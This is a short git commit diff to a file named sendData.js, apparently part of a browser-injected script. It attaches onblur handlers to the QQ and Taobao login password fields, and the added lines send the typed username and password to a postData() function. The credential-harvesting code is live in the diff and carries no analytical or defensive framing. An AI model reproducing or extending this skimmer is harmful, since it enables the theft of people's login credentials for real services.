0abbb1e6486caad1fb0fa2f72b5e2ef7d25e0a7e
CatcherX <189174112@qq.com>
2014-09-23 14:15:40 +0800

    Update sendData.js

--- js/sendData.js
+++ js/sendData.js
@@ -25,5 +25,5 @@ var qqPw=document.getElementById('p');
 qqPw.setAttribute("onblur","postData(document.getElementById('u').value + document.getElementById('p').value);");
 
 //taobao.com
-
-//alipay.com
+var taobaoPw=document.getElementById('TPL_password_1');
+taobaoPw.setAttribute("onblur","postData(document.getElementById('TPL_username_1').value + document.getElementById('TPL_password_1').value);");
